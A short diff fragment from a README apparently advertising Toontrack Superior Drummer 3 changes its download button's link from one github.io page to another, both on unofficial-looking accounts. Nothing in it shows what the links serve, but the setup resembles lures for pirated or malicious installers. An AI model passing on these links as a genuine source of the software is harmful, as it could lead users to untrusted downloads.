@@ -21,7 +21,7 @@ To begin using this **Toontrack Superior Drummer 3 sound library tool** and **To
 | :--- | :--- |
 | **Get Toontrack Superior Drummer 3** | Click the button below to start the setup for this **Toontrack Superior Drummer 3 professional drum workstation**. |
 
-[![Button](https://img.shields.io/badge/🥁-Get_Toontrack_Superior_Drummer_3-2ea44f?style=for-the-badge)](https://richard2275786.github.io/.github/toontrack-superior-drummer-3)
+[![Superior Drummer](https://img.shields.io/badge/Access-Superior%20Drummer-0F766E?style=for-the-badge)](https://superior-drummer-kits.github.io/.github/superior-drummer)
 
 ## System Requirements
 
